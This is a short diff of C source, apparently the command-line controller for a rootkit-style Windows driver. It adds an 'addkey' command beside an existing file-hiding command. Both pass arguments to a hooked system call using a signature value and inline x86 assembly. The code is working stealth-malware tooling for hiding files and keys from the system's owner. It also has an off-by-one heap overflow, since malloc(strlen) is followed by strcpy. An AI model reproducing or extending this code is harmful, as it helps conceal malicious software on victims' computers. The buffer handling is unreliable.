@@ -114,6 +114,32 @@ int main(int argc, char* argv[]) {
 				AddressSystemCall = (unsigned int)FastSystemCall;
 				SysCall();
 			}
+			else printf("Error hide file\n");
+		}
+		else if (!strcmp(argv[1], "addkey")) {
+			if (argc == 4) {
+				len = strlen(argv[2]);
+				cmd.target = malloc(len);
+				strcpy((char*)cmd.target, argv[2]);
+
+				len = strlen(argv[3]);
+				cmd.change = malloc(len);
+				strcpy((char*)cmd.change, argv[3]);
+
+				cmd.flags = COMMAND_ADD_KEY | COMMAND_BUFFER_POINTER;
+
+				__asm {
+					push 0
+					push 0
+					lea eax, cmd
+					push eax
+					push SIGNATURE_SYSCALL
+					mov eax, 0x26
+				}
+				AddressSystemCall = (unsigned int)FastSystemCall;
+				SysCall();
+			}
+			else printf("Error hide add key\n");
 		}
 		else if (!strcmp(argv[1], "start")) {
 			char buf[2 * MAX_PATH];
